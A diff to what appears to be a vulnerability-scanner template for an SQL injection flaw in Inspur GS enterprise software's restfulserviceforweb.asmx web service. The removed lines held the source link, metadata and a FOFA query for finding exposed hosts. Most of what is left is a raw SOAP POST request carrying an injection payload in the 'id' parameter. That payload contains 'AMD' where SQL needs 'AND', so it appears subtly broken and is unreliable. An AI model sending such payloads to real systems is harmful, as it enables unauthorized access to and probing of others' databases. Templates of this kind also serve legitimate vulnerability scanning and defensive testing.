@@ -3,12 +3,8 @@ info:
   name: 浪潮GS的restfulserviceforweb.asmx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mu8i1ygfno0w6pcc'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mu8i1ygfno0w6pcc
-    fofa: body="cwbase/web/scripts/aes.js" || title="GS企业管理软件" || body="weblogin/index.aspx"
 http:
 - raw:
   - "POST /GSPIDM/gsp/webservice/restfulwebservice/restfulserviceforweb.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.1617.9 Safari/537.36\nContent-Type: application/soap+xml; charset=utf-8\nContent-Length: 1187\nConnection: close\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                 xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n                 xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap12:Body>\n    <Get xmlns=\"http://tempuri.org/\">\n      <Resource>AuthDataModify</Resource>\n      <Parameter>\n        <ArrayOfString>\n          <string>id</string>\n          <string>admin' AMD 7707 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT(CASE WHEN (7707=7707) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(107)+CHAR(113)))--xMuK</string>\n        </ArrayOfString>\n        <ArrayOfString>\n          <string>location</string>\n          <string>0</string>\n        </ArrayOfString>\n      </Parameter>\n    </Get>\n  </soap12:Body>\n</soap12:Envelope>"
